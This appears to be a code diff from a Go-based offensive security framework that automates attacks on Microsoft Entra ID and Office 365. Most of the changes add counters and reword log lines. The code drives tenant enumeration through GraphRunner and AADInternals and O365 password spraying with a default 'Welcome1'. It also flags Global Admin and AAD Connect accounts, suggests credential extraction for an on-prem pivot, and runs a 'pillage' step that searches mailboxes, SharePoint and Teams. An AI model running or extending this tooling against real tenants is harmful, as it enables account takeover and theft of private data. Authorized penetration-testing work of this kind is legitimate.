@@ -72,25 +72,29 @@ func enumerateWithGraphRunner(ctx context.Context, state *core.ADState, result *
 	slog.Info("enumerating Entra ID via GraphRunner")
 
 	if cr, err := tools.GraphRunner.RunUserEnum(ctx, graphTokens); err == nil {
-		parseJSONResources(cr.Stdout, "user", result, state, "GraphRunner")
+		n := parseJSONResources(cr.Stdout, "user", result, state, "GraphRunner")
+		slog.Info("GraphRunner: discovered users", "count", n)
 	} else {
 		slog.Warn("GraphRunner user enumeration failed", "error", err)
 	}
 
 	if cr, err := tools.GraphRunner.RunGroupEnum(ctx, graphTokens); err == nil {
-		parseJSONResources(cr.Stdout, "group", result, state, "GraphRunner")
+		n := parseJSONResources(cr.Stdout, "group", result, state, "GraphRunner")
+		slog.Info("GraphRunner: discovered groups", "count", n)
 	} else {
 		slog.Warn("GraphRunner group enumeration failed", "error", err)
 	}
 
 	if cr, err := tools.GraphRunner.RunAppEnum(ctx, graphTokens); err == nil {
-		parseJSONResources(cr.Stdout, "app", result, state, "GraphRunner")
+		n := parseJSONResources(cr.Stdout, "app", result, state, "GraphRunner")
+		slog.Info("GraphRunner: discovered apps", "count", n)
 	} else {
 		slog.Warn("GraphRunner app enumeration failed", "error", err)
 	}
 
 	if cr, err := tools.GraphRunner.RunCAPEnum(ctx, graphTokens); err == nil {
-		parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "GraphRunner")
+		n := parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "GraphRunner")
+		slog.Info("GraphRunner: discovered CAPs", "count", n)
 	} else {
 		slog.Warn("GraphRunner CAP enumeration failed", "error", err)
 	}
@@ -124,26 +128,30 @@ func enumerateWithAADInternals(ctx context.Context, state *core.ADState, result 
 	slog.Info("enumerating Entra ID via AADInternals")
 
 	if cr, err := tools.AADInternals.RunTenantEnum(ctx, username, password); err == nil {
-		parseJSONResources(cr.Stdout, "user", result, state, "AADInternals")
+		n := parseJSONResources(cr.Stdout, "user", result, state, "AADInternals")
+		slog.Info("AADInternals: discovered users", "count", n)
 	} else {
 		slog.Warn("AADInternals tenant enumeration failed", "error", err)
 	}
 
 	if cr, err := tools.AADInternals.RunSPEnum(ctx, username, password); err == nil {
-		parseJSONResources(cr.Stdout, "service_principal", result, state, "AADInternals")
+		n := parseJSONResources(cr.Stdout, "service_principal", result, state, "AADInternals")
+		slog.Info("AADInternals: discovered service principals", "count", n)
 	} else {
 		slog.Warn("AADInternals service principal enumeration failed", "error", err)
 	}
 
 	if cr, err := tools.AADInternals.RunCAPEnum(ctx, username, password); err == nil {
-		parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "AADInternals")
+		n := parseJSONResources(cr.Stdout, "conditional_access_policy", result, state, "AADInternals")
+		slog.Info("AADInternals: discovered conditional access policies", "count", n)
 	} else {
 		slog.Warn("AADInternals CAP enumeration failed", "error", err)
 	}
 }
 
-func parseJSONResources(stdout string, resType string, result *core.ToolResult, state *core.ADState, toolName string) {
+func parseJSONResources(stdout string, resType string, result *core.ToolResult, state *core.ADState, toolName string) int {
 	lines := strings.Split(stdout, "\n")
+	count := 0
 	for _, line := range lines {
 		trimmed := strings.TrimSpace(line)
 		if trimmed == "" {
@@ -196,7 +204,9 @@ func parseJSONResources(stdout string, resType string, result *core.ToolResult, 
 			Confidence: 0.8,
 			Timestamp:  time.Now(),
 		})
+		count++
 	}
+	return count
 }
 
 func RunCloudCredentialAcquisition(ctx context.Context, state *core.ADState, tenant, userlist, password string) *core.ToolResult {
@@ -258,21 +268,22 @@ func RunCloudCredentialAcquisition(ctx context.Context, state *core.ADState, ten
 		password = "Welcome1"
 	}
 
-	slog.Info("password spraying O365", "tenant", tenant, "password", "[REDACTED]")
+	slog.Info("cloud cred-acq: password spraying O365", "tenant", tenant, "password", "[REDACTED]", "userlist", userlist)
 	cr, err := tools.O365spray.RunSpray(ctx, tenant, userlist, password)
 	if err != nil {
-		slog.Error("o365spray failed", "error", err)
+		slog.Error("cloud cred-acq: o365spray failed", "error", err)
 		result.Success = false
 		result.RawOutput = cr.Stdout
 		return result
 	}
 
+	slog.Info("cloud cred-acq: o365spray completed, parsing results")
 	result.RawOutput = cr.Stdout
 	lines := strings.Split(cr.Stdout, "\n")
 	for _, line := range lines {
 		trimmed := strings.TrimSpace(line)
 		if strings.Contains(trimmed, "[+]") || strings.Contains(trimmed, "VALID") {
-			slog.Info("o365spray found valid credential", "detail", trimmed)
+			slog.Warn("cloud cred-acq: valid credential found", "detail", trimmed)
 			fields := strings.Fields(trimmed)
 			var sprayUser, sprayPass string
 			for i, f := range fields {
@@ -335,7 +346,7 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 	for _, r := range state.CloudResources {
 		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "global administrator") {
 			foundGA = true
-			slog.Warn("global admin found", "resource", r.Name)
+			slog.Warn("cloud privesc: global admin found", "resource", r.Name)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type:       core.EvPrivEscalated,
 				Phase:      core.PhaseCloudPrivesc,
@@ -348,7 +359,7 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 		}
 		if r.Type == "user" && strings.Contains(strings.ToLower(r.Properties), "privileged role administrator") {
 			foundPRA = true
-			slog.Warn("privileged role admin found", "resource", r.Name)
+			slog.Warn("cloud privesc: privileged role admin found", "resource", r.Name)
 			result.Evidence = append(result.Evidence, core.EvidenceEntry{
 				Type:       core.EvPrivEscalated,
 				Phase:      core.PhaseCloudPrivesc,
@@ -360,22 +371,26 @@ func RunCloudPrivesc(ctx context.Context, state *core.ADState, tenant string) *c
 			})
 		}
 		if r.Type == "app" && strings.Contains(strings.ToLower(r.Properties), "applicationimpersonation") {
-			slog.Warn("application impersonation found", "resource", r.Name)
+			slog.Warn("cloud privesc: application impersonation found", "resource", r.Name)
 		}
 		if r.Type == "service_principal" && strings.Contains(strings.ToLower(r.Name), "aad connect") {
 			foundAADConnect = true
-			slog.Warn("AAD Connect detected — potential hybrid privesc", "resource", r.Name)
+			slog.Warn("cloud privesc: AAD Connect detected — potential hybrid privesc", "resource", r.Name)
 		}
 	}
 
-	if !foundGA {
-		slog.Info("no global admin detected in current resources")
+	if foundGA {
+		slog.Warn("cloud privesc: elevation paths available — Global Admin role present", "count", 1)
+	} else {
+		slog.Info("cloud privesc: no global admin detected in current resources")
 	}
-	if !foundPRA {
-		slog.Info("no privileged role admin detected")
+	if foundPRA {
+		slog.Warn("cloud privesc: Privileged Role Administrator present — can elevate to GA")
+	} else {
+		slog.Info("cloud privesc: no privileged role admin detected")
 	}
 	if foundAADConnect {
-		slog.Warn("AAD Connect present — consider AADConnect credential extraction")
+		slog.Warn("cloud privesc: AAD Connect present — consider AADConnect credential extraction for on-prem pivot")
 	}
 
 	state.Phases[core.PhaseCloudPrivesc] = core.PhaseComplete
@@ -408,9 +423,10 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 	slog.Info("starting cloud pillage", "search_terms", searchTerms)
 
 	for _, term := range searchTerms {
-		slog.Debug("searching mailboxes", "term", term)
+		slog.Info("cloud pillage: searching mailboxes", "term", term)
 		if cr, err := tools.GraphRunner.RunMailboxSearch(ctx, graphTokens, term, 10); err == nil {
 			lines := strings.Split(cr.Stdout, "\n")
+			mailCount := 0
 			for _, line := range lines {
 				trimmed := strings.TrimSpace(line)
 				if trimmed == "" {
@@ -425,14 +441,17 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 					Confidence: 0.6,
 					Timestamp:  time.Now(),
 				})
+				mailCount++
 			}
+			slog.Info("cloud pillage: mailbox results", "term", term, "count", mailCount)
 		} else {
-			slog.Warn("mailbox search failed", "term", term, "error", err)
+			slog.Warn("cloud pillage: mailbox search failed", "term", term, "error", err)
 		}
 
-		slog.Debug("searching SharePoint/OneDrive", "term", term)
+		slog.Info("cloud pillage: searching SharePoint/OneDrive", "term", term)
 		if cr, err := tools.GraphRunner.RunSharePointSearch(ctx, graphTokens, term); err == nil {
 			lines := strings.Split(cr.Stdout, "\n")
+			spoCount := 0
 			for _, line := range lines {
 				trimmed := strings.TrimSpace(line)
 				if trimmed == "" {
@@ -447,14 +466,17 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 					Confidence: 0.6,
 					Timestamp:  time.Now(),
 				})
+				spoCount++
 			}
+			slog.Info("cloud pillage: SharePoint results", "term", term, "count", spoCount)
 		} else {
-			slog.Warn("SharePoint search failed", "term", term, "error", err)
+			slog.Warn("cloud pillage: SharePoint search failed", "term", term, "error", err)
 		}
 
-		slog.Debug("searching Teams messages", "term", term)
+		slog.Info("cloud pillage: searching Teams messages", "term", term)
 		if cr, err := tools.GraphRunner.RunTeamsSearch(ctx, graphTokens, term); err == nil {
 			lines := strings.Split(cr.Stdout, "\n")
+			teamsCount := 0
 			for _, line := range lines {
 				trimmed := strings.TrimSpace(line)
 				if trimmed == "" {
@@ -469,9 +491,11 @@ func RunCloudPillage(ctx context.Context, state *core.ADState, searchTerms []str
 					Confidence: 0.6,
 					Timestamp:  time.Now(),
 				})
+				teamsCount++
 			}
+			slog.Info("cloud pillage: Teams results", "term", term, "count", teamsCount)
 		} else {
-			slog.Warn("Teams search failed", "term", term, "error", err)
+			slog.Warn("cloud pillage: Teams search failed", "term", term, "error", err)
 		}
 	}
 
